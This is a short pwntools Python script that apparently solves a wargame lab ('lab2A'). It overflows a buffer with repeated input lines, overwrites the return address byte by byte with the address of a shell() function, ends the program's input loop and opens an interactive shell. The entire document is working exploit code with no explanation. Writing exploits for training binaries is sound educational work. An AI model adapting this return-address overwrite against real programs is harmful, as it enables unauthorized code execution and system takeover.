from pwn import *
pwnlib.args.SILENT('SILENT')

p = process('./lab2A')
p.recvuntil('Input 10 words:\n')

# Fill in 24 bytes from the beginning of cat_buf
for i in range(24):
	p.sendline('AAAABBBBCCCCDD')

# Overwrite return address with &shell() (0x80486fd)
p.sendline('\xfd')
p.sendline('\x86')
p.sendline('\x04')
p.sendline('\x08')

# End the for-loop
p.sendline('AAAABBBBCCCC' + p32(9))
p.interactive()
